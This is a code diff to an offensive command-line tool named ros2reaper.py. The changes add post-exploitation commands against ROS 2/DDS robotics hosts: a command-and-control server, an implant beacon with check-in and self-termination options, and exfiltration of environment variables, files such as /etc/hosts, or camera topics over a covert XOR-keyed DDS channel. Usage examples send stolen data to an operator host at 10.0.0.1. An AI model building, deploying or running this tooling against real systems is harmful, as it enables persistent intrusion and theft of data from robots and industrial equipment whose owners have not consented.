@@ -64,6 +64,12 @@ Commands (Phase 3: ICS/OT Bridge Analysis):
     aws-scan       - AWS IoT Greengrass ↔ DDS bridge attack surface analysis
     shodan-dds     - Internet-wide DDS exposure search via Shodan API
 
+Commands (Phase 4: Post-Exploitation / C2):
+    c2-server      - Start operator C2 server and interactive shell
+    c2-beacon      - Deploy implant beacon on compromised ROS 2 host
+    c2-exfil       - Exfiltrate data from compromised host over covert DDS channel
+    c2-recv        - Receive and reassemble exfiltrated data on operator side
+
 Author: Gh057x
 License: MIT — Use responsibly.
 """
@@ -1000,6 +1006,96 @@ def cmd_aws_scan(args):
     scanner.run()
 
 
+# =============================================================================
+# Phase 4: C2 Commands
+# =============================================================================
+
+def cmd_c2_server(args):
+    """Start operator C2 server and interactive shell"""
+    from modules.phase4.c2_server import run_server
+    from modules.phase4.c2_channel import DEFAULT_KEY
+
+    key = args.c2_key.encode() if args.c2_key else DEFAULT_KEY
+    print(f"[*] Starting C2 server on domain {args.domain_id}")
+    run_server(
+        domain_id = args.domain_id,
+        key       = key,
+        verbose   = args.verbose,
+        output    = args.output,
+    )
+
+
+def cmd_c2_beacon(args):
+    """Deploy C2 beacon / implant on this host"""
+    from modules.phase4.c2_beacon import run_beacon
+    from modules.phase4.c2_channel import DEFAULT_KEY
+
+    if not args.target:
+        print("[-] --target required for c2-beacon (C2 server IP)")
+        return
+
+    key = args.c2_key.encode() if args.c2_key else DEFAULT_KEY
+    print(f"[*] Starting beacon → C2 at {args.target}  interval={args.c2_interval}s")
+    run_beacon(
+        c2_ip     = args.target,
+        domain_id = args.domain_id,
+        interval  = args.c2_interval,
+        key       = key,
+        max_ttl   = args.c2_ttl,
+        verbose   = args.verbose,
+    )
+
+
+def cmd_c2_exfil(args):
+    """Exfiltrate data from this host to C2 server over covert DDS channel"""
+    from modules.phase4.c2_exfil import run_exfil
+    from modules.phase4.c2_channel import DEFAULT_KEY, _make_session_id
+
+    if not args.target:
+        print("[-] --target required for c2-exfil (C2 server IP)")
+        return
+
+    mode   = args.exfil_mode or "env"
+    key    = args.c2_key.encode() if args.c2_key else DEFAULT_KEY
+    sid    = args.c2_session or _make_session_id()
+    params = {}
+    if args.exfil_path:
+        params["path"]  = args.exfil_path
+    if args.topic:
+        params["topic"] = args.topic
+
+    print(f"[*] Exfil mode={mode}  target={args.target}  session={sid}")
+    run_exfil(
+        c2_ip      = args.target,
+        session_id = sid,
+        mode       = mode,
+        params     = params,
+        domain_id  = args.domain_id,
+        key        = key,
+        verbose    = args.verbose,
+    )
+
+
+def cmd_c2_recv(args):
+    """Receive and reassemble exfil data on operator side"""
+    from modules.phase4.c2_exfil import run_exfil_receive
+    from modules.phase4.c2_channel import DEFAULT_KEY
+
+    if not args.c2_session:
+        print("[-] --c2-session required for c2-recv")
+        return
+
+    key = args.c2_key.encode() if args.c2_key else DEFAULT_KEY
+    run_exfil_receive(
+        session_id = args.c2_session,
+        output     = args.output,
+        domain_id  = args.domain_id,
+        key        = key,
+        timeout    = args.timeout,
+        verbose    = args.verbose,
+    )
+
+
 def cmd_shodan_dds(args):
     """Internet-wide DDS exposure search via Shodan"""
     from modules.phase3.shodan_dds import ShodanDDSScanner
@@ -1300,6 +1396,14 @@ Examples:
   python3 ros2reaper.py shodan-dds --api-key YOUR_KEY --context scada -o shodan.json --skip-auth
   python3 ros2reaper.py shodan-dds --api-key YOUR_KEY --target 1.2.3.4 --skip-auth
   python3 ros2reaper.py shodan-dds --api-key YOUR_KEY --export targets.txt --skip-auth
+
+  # Phase 4: Post-Exploitation / C2 (covert channel over DDS)
+  python3 ros2reaper.py c2-server --domain-id 0 --skip-auth                          # operator side
+  python3 ros2reaper.py c2-beacon --target 10.0.0.1 --c2-interval 20 --skip-auth    # on compromised host
+  python3 ros2reaper.py c2-exfil  --target 10.0.0.1 --exfil-mode env --skip-auth    # exfil env vars
+  python3 ros2reaper.py c2-exfil  --target 10.0.0.1 --exfil-mode files --exfil-path /etc/hosts --skip-auth
+  python3 ros2reaper.py c2-exfil  --target 10.0.0.1 --exfil-mode topic --topic /camera/image_raw --skip-auth
+  python3 ros2reaper.py c2-recv   --c2-session <session_id> -o exfil_out.bin --skip-auth
         """,
     )
 
@@ -1315,7 +1419,9 @@ Examples:
                                  "rb-enum", "rb-inject", "rb-audit",
                                  # Phase 3: ICS/OT Bridge Analysis
                                  "ics-enum", "modbus-scan", "mqtt-scan",
-                                 "opcua-scan", "aws-scan", "shodan-dds"],
+                                 "opcua-scan", "aws-scan", "shodan-dds",
+                                 # Phase 4: Post-Exploitation / C2
+                                 "c2-server", "c2-beacon", "c2-exfil", "c2-recv"],
                         help="Command to execute")
 
     # Target options
@@ -1416,6 +1522,27 @@ Examples:
     parser.add_argument("--export", default=None,
                         help="Export IP list from Shodan results to file")
 
+    # Phase 4: C2 options
+    parser.add_argument("--c2-key", default=None,
+                        help="C2 channel XOR key (default: built-in key)")
+    parser.add_argument("--c2-session", default=None,
+                        dest="c2_session",
+                        help="C2 session ID (for c2-recv / c2-exfil)")
+    parser.add_argument("--c2-interval", type=float, default=30.0,
+                        dest="c2_interval",
+                        help="Beacon check-in interval in seconds (default: 30.0)")
+    parser.add_argument("--c2-ttl", type=int, default=0,
+                        dest="c2_ttl",
+                        help="Beacon max check-ins before self-termination (0=forever)")
+    parser.add_argument("--exfil-mode",
+                        choices=["topic", "params", "files", "env"],
+                        default=None,
+                        dest="exfil_mode",
+                        help="Exfil data source: topic, params, files, env")
+    parser.add_argument("--exfil-path", default=None,
+                        dest="exfil_path",
+                        help="File path for exfil mode=files")
+
     # Output options
     parser.add_argument("-o", "--output", help="Output file path (JSON)")
     parser.add_argument("-v", "--verbose", action="store_true",
@@ -1465,6 +1592,11 @@ Examples:
         "opcua-scan":    cmd_opcua_scan,
         "aws-scan":      cmd_aws_scan,
         "shodan-dds":    cmd_shodan_dds,
+        # Phase 4: Post-Exploitation / C2
+        "c2-server":     cmd_c2_server,
+        "c2-beacon":     cmd_c2_beacon,
+        "c2-exfil":      cmd_c2_exfil,
+        "c2-recv":       cmd_c2_recv,
     }
 
     try:
